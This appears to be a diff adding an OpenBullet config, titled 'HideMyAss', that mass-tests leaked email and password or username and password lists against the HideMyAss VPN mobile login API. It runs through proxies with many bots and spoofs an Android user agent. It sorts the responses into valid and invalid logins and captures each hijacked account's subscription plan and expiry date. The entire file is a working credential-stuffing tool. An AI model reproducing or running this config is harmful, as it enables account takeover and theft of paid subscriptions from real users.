@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "HideMyAss",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-16T12:18:49.8776188-07:00",
+  "AdditionalInfo": "",
+  "Author": "GlennDx",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Hello REQUEST POST "https://mobile.api.hmageo.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G950F Build\\/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#I'm KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":0,\"data\":{\"user\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username/password combination" 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "\",\"plan\":\"\"," 
+    KEY "1970" 
+
+#Broke PARSE "<SOURCE>" LR "\",\"plan\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+#send_help PARSE "<SOURCE>" LR "\",\"expires\":\"" "T" CreateEmpty=FALSE -> CAP "Expires" 
+
